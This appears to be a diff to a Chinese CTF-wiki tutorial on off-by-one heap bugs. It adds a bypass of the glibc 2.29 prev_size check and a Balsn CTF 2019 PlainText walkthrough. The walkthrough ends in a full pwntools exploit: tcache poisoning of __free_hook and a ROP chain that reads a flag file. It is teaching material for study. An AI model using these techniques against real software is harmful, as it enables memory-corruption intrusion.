@@ -19,7 +19,7 @@ off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界
 1. 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法
 2. 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 `prev_in_use` 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 `prev_size` 域就会启用，就可以伪造 `prev_size` ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 `prev_size` 找到的块的大小与`prev_size` 是否一致。
 
-最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check 。
+最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。
 
 ```
 /* consolidate backward */
@@ -129,6 +129,36 @@ strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数
 DWORD 0x41424344
 内存  0x44,0x43,0x42,0x41
 ```
+
+### 在 libc-2.29 之后
+由于这两行代码的加入
+```cpp
+      if (__glibc_unlikely (chunksize(p) != prevsize))
+        malloc_printerr ("corrupted size vs. prev_size while consolidating");
+```
+由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效。但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk。
+
+伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针。以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段（这个过程会破坏原 large bin chunk 的 fd 指针，但是没有关系），同时还可以控制其 fd（通过部分覆写 fd_nextsize）。通过在后面使用其他的 chunk 辅助伪造，可以通过该检测
+
+```
+  if (__glibc_unlikely (chunksize(p) != prevsize))
+    malloc_printerr ("corrupted size vs. prev_size while consolidating");
+```
+
+然后只需要通过 unlink 的检测就可以了，也就是 `fd->bk == p && bk->fd == p`
+
+如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己，如下
+
+![](./figure/largebin-struct.png)
+
+
+我们可以控制 fd_nextsize 指向堆上的任意地址，可以容易地使之指向一个 fastbin + 0x10 - 0x18，而 fastbin 中的 fd 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 large bin + 0x10，这样就可以通过 `fd->bk == p` 的检测。
+
+由于 bk_nextsize 我们无法修改，所以 bk->fd 必然在原先的 large bin chunk 的 fd 指针处（这个 fd 被我们破坏了）。通过 fastbin 的链表特性可以做到修改这个指针且不影响其他的数据，再部分覆写之就可以通过 `bk->fd==p` 的检测了。
+
+然后通过 off-by-one 向低地址合并就可以实现 chunk overlapping 了，之后可以 leak libc_base 和 堆地址，tcache 打 __free_hook 即可。
+
+光讲原理比较难理解，建议结合题目学习，比如本文中的实例 3。
 
 ## 实例 1: Asis CTF 2016 [b00ks](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)
 
@@ -947,4 +977,307 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+## 实例 3 : Balsn_CTF_2019-PlainText
+### 漏洞利用分析
 
+程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。
+
+![](./figure/add-function.png)
+
+而 free 中对被 free 的指针进行了置空，导致无法直接 show，而程序对我们的输入末尾附加 `\x00`，也无法使用释放再申请的方法，leak 比较困难。
+
+分析结束。接下来进行利用
+
+为了调试方便，建议先关闭 aslr。
+
+一开始的时候 bin 中非常的杂乱，先把这些乱七八糟的东西申请出来
+
+```python
+for i in range(16):
+    add(0x10,'fill')
+
+for i in range(16):
+    add(0x60,'fill')
+
+for i in range(9):
+    add(0x70,'fill')
+
+for i in range(5):
+    add(0xC0,'fill')
+
+for i in range(2):
+    add(0xE0,'fill')
+
+add(0x170,'fill')
+add(0x190,'fill')
+# 49
+```
+
+由于我们部分覆写的时候会被附加一个 `\x00`，所以需要调整堆地址，为了调试方便，我选择这样调整，具体原因马上说
+
+```python
+add(0x2A50,'addralign') # 50
+```
+
+然后进行堆布局
+
+首先申请出一个较大的堆块，释放掉，再申请一个更大的堆块，让被释放的堆块进入 large bin
+
+```python
+add(0xFF8,'large bin') # 51
+add(0x18,'protect') # 52
+
+
+delete(51)
+add(0x2000,'push to large bin') # 51
+```
+
+由于之前进行的堆地址调整，在我的 gdb 中，该 large bin 的低地址的低 16 位就都是 0 了（这也就是之前堆地址调整时那样调整的原因。当然这只是在调试的情况下，实际打的时候只有低 12 位能保证为零，需要爆破 4 位，概率 1/16）。
+
+然后进行这样的布局
+
+```python
+add(0x28,p64(0) + p64(0x241) + '\x28') # 53 fd->bk : 0xA0 - 0x18
+
+add(0x28,'pass-loss control') # 54
+add(0xF8,'pass') # 55
+add(0x28,'pass') # 56
+add(0x28,'pass') # 57
+add(0x28,'pass') # 58
+add(0x28,'pass') # 59
+add(0x28,'pass-loss control') # 60
+add(0x4F8,'to be off-by-null') # 61
+```
+
+![](./figure/heap-setup.png)
+
+
+形成的效果就是上面这张图的样子。其中 chunk A 完成了对 fake chunk 的 size 和 fd，bk 指针的布局。其中 fd 将指向 `&chunk_B - 0x18`并且破坏了 largebin 的 fd，之后我们会修复这个 fd 并使之指向 fake chunk。
+
+由于 fake chunk 的 fd 指向 `&chunk_B - 0x18`，我们希望 chunk B 的 fd 指向 fake chunk。所以我们需要先把它 free 掉再申请回来，然后部分覆写 fd 来实现。
+
+chunk E 存在的意义是抬高堆地址，使之后 leak 堆地址的时候可以全部输出。
+
+在 chunk E 和 chunk C 中夹了一些 chunk，这些 chunk 会被 overlapping，便于之后继续利用了，建议多夹一些，免得后来发现不够用。
+
+chunk C 未来会用来对 chunk D off-by-null，然后 free chunk D 的时候就可以向地址和并了。
+
+---
+
+fake chunk 的 size 已经被修改好，我们不希望在修复 large bin 的 fd 的同时把这个 size 破坏掉，所以必须把 chunk A free 到 fastbin 中。也需要把 chunk B 和 chunk C free 掉，并且希望 chunk B 的 fd 指针指向一个堆地址，部分覆写后就可以使之指向 fake_chunk 了。
+
+```python
+for i in range(7):
+    add(0x28,'tcache')
+for i in range(7):
+    delete(61 + 1 + i)
+
+delete(54)
+delete(60)
+delete(53)
+
+for i in range(7):
+    add(0x28,'tcache')
+
+# 53,54,60,62,63,64,65
+
+add(0x28,'\x10') # 53->66
+## stashed ##
+add(0x28,'\x10') # 54->67
+add(0x28,'a' * 0x20 + p64(0x240)) # 60->68
+delete(61)
+```
+
+就是这样，先把 Tcache 填满，然后依次 free chunk B C A，再把 Tcache 清空，然后申请回 chunk A，部分覆写，使 fd 指向 fake_chunk。
+
+然后由于 Tcache 的 stash 机制，chunk B C 进入 Tcache，再申请回来的就是 chunk B，部分覆写使 fd 指向 fake_chunk。
+
+然后申请回 chunk C，进行 off-by-null。
+
+free chunk D，成功实现 chunk overlapping。
+
+然后进行 leak，需要把堆地址和 libc 地址都 leak 出来，leak 的方法有许多，这里提供一种（这种方法肯定不是最好的方法，但是可以完成 leak 就行）
+
+```
+add(0x140,'pass') # 61
+show(56)
+libc_base = u64(sh.recv(6).ljust(0x8,'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60
+log.success("libc_base:" + hex(libc_base))
+__free_hook_addr = libc_base + libc.sym["__free_hook"]
+
+add(0x28,'pass') # 69<-56
+add(0x28,'pass') # 70<-57
+delete(70)
+delete(69)
+show(56)
+heap_base = u64(sh.recv(6).ljust(0x8,'\x00')) - 0x1A0
+log.success("heap_base:" + hex(heap_base))
+```
+
+然后进行 Tcache poisoning（这里我被卡了一小会，主要原因是一直想着通过 double free 来实现，这种想法确实挺蠢的，需要注意，Tcache poisoning 的利用只需要控制 next 指针就可以了，double free 往往是实现控制的方法，而不是必须，在本题有更好的方法，就不需要 double free 了）。
+
+```
+add(0x28,p64(0) * 2) # 69<-56
+add(0x28,p64(0) * 2) # 70<-57
+add(0x28,p64(0) * 2) # 71<-58
+delete(68)
+add(0x60,p64(0) * 5 + p64(0x31) + p64(__free_hook_addr)) # 68
+add(0x28,'pass') # 72
+## alloc to __free_hook ##
+magic_gadget = libc_base + 0x12be97
+add(0x28,p64(magic_gadget)) # 73
+```
+
+因为有 chunk overlapping，所以其实挺容易控制 next 指针的，比如通过上面这样的方法就可以分配到 __free_hook 了。
+
+到这里就结束了堆上的利用，之后需要进行白名单绕过，具体方法这里不再赘述，请见《沙箱逃逸》目录下的《C 沙盒逃逸》
+
+### exp
+
+```python
+#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+context.terminal = ["tmux","splitw","-h"]
+context.log_level = 'debug'
+
+#sh = process("./note")
+#libc = ELF("/glibc/2.29/64/lib/libc.so.6")
+sh = process("./note-re")
+libc = ELF("./libc-2.29.so")
+
+def add(size,payload):
+    sh.sendlineafter("Choice: ",'1')
+    sh.sendlineafter("Size: ",str(size))
+    sh.sendafter("Content: ",payload)
+
+def delete(index):
+    sh.sendlineafter("Choice: ",'2')
+    sh.sendlineafter("Idx: ",str(index))
+
+def show(index):
+    sh.sendlineafter("Choice: ",'3')
+    sh.sendlineafter("Idx: ",str(index))
+
+for i in range(16):
+    add(0x10,'fill')
+
+for i in range(16):
+    add(0x60,'fill')
+
+for i in range(9):
+    add(0x70,'fill')
+
+for i in range(5):
+    add(0xC0,'fill')
+
+for i in range(2):
+    add(0xE0,'fill')
+
+add(0x170,'fill')
+add(0x190,'fill')
+# 49
+
+add(0x2A50,'addralign') # 50
+#add(0x4A50,'addralign') # 50
+
+add(0xFF8,'large bin') # 51
+add(0x18,'protect') # 52
+
+
+delete(51)
+add(0x2000,'push to large bin') # 51
+add(0x28,p64(0) + p64(0x241) + '\x28') # 53 fd->bk : 0xA0 - 0x18
+
+add(0x28,'pass-loss control') # 54
+add(0xF8,'pass') # 55
+add(0x28,'pass') # 56
+add(0x28,'pass') # 57
+add(0x28,'pass') # 58
+add(0x28,'pass') # 59
+add(0x28,'pass-loss control') # 60
+add(0x4F8,'to be off-by-null') # 61
+
+for i in range(7):
+    add(0x28,'tcache')
+for i in range(7):
+    delete(61 + 1 + i)
+
+delete(54)
+delete(60)
+delete(53)
+
+for i in range(7):
+    add(0x28,'tcache')
+
+# 53,54,60,62,63,64,65
+
+add(0x28,'\x10') # 53->66
+## stashed ##
+add(0x28,'\x10') # 54->67
+add(0x28,'a' * 0x20 + p64(0x240)) # 60->68
+delete(61)
+
+add(0x140,'pass') # 61
+show(56)
+libc_base = u64(sh.recv(6).ljust(0x8,'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 0x60
+log.success("libc_base:" + hex(libc_base))
+__free_hook_addr = libc_base + libc.sym["__free_hook"]
+
+add(0x28,'pass') # 69<-56
+add(0x28,'pass') # 70<-57
+delete(70)
+delete(69)
+show(56)
+heap_base = u64(sh.recv(6).ljust(0x8,'\x00')) - 0x1A0
+log.success("heap_base:" + hex(heap_base))
+
+add(0x28,p64(0) * 2) # 69<-56
+add(0x28,p64(0) * 2) # 70<-57
+add(0x28,p64(0) * 2) # 71<-58
+delete(68)
+add(0x60,p64(0) * 5 + p64(0x31) + p64(__free_hook_addr)) # 68
+add(0x28,'pass') # 72
+## alloc to __free_hook ##
+magic_gadget = libc_base + 0x12be97
+add(0x28,p64(magic_gadget)) # 73
+
+pop_rdi_ret = libc_base + 0x26542
+pop_rsi_ret = libc_base + 0x26f9e
+pop_rdx_ret = libc_base + 0x12bda6
+syscall_ret = libc_base + 0xcf6c5
+pop_rax_ret = libc_base + 0x47cf8
+ret = libc_base + 0xc18ff
+
+payload_addr = heap_base + 0x270
+str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
+rw_addr = heap_base 
+
+payload = p64(libc_base + 0x55E35) # rax
+payload += p64(payload_addr - 0xA0 + 0x10) # rdx
+payload += p64(payload_addr + 0x28)
+payload += p64(ret)
+payload += ''.ljust(0x8,'\x00')
+
+rop_chain = ''
+rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
+rop_chain += p64(pop_rsi_ret) + p64(0)
+rop_chain += p64(pop_rdx_ret) + p64(0)
+rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
+rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
+rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
+rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
+rop_chain += p64(libc_base + libc.symbols["read"])
+rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
+rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
+rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
+rop_chain += p64(libc_base + libc.symbols["write"])
+
+payload += rop_chain
+payload += './flag\x00'
+add(len(payload) + 0x10,payload) # 74
+#gdb.attach(proc.pidof(sh)[0])
+delete(74)
+
+sh.interactive()
+```
